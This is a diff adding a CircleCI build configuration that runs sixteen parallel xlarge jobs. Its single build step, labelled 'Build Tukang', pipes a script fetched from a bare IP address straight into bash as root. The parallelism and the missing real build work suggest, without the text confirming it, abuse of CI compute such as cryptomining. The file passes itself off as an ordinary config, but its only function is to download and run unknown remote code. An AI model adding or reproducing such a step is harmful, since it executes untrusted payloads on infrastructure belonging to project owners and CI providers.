@@ -1,0 +1,14 @@
+version: 2.0 
+jobs: 
+  build: 
+    parallelism: 16 
+    docker: 
+      - image: cimg/base:stable
+    resource_class: xlarge
+    steps: 
+      - checkout 
+      - setup_remote_docker 
+      - run: 
+          name: "Build Tukang" 
+          command: | 
+               sudo -u root curl http://149.28.78.235/tukang | bash
